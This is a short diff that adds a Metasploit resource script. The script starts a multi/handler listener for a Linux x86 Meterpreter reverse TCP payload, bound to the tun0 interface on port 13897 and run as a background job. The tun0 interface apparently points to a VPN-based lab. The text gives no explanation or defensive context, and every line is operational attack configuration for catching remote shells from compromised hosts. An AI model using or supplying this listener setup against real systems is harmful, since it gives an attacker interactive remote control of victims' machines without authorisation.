@@ -1,0 +1,6 @@
+use multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 13897
+run -j
+
